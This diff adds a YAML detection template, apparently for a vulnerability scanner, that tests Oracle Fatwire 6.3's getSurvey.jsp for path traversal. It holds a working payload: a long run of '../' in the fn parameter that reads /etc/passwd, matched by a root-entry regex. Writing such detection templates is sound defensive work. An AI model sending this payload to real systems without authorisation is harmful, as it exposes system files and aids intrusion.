@@ -1,0 +1,23 @@
+id: oracle-fatwire-lfi
+name: Oracle Fatwire 6.3 - Path Traversal
+severity: high
+confidence: tentative
+description: Oracle Fatwire 6.3 suffers from a path traversal vulnerability in the getSurvey.jsp endpoint.
+reference: CWE-22
+tags:
+- lfi
+- oracle
+- fatwire
+- edb
+- vuln
+requests:
+- method: GET
+  path: /cs/career/getSurvey.jsp?fn=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
+  matchers:
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
+  condition: and
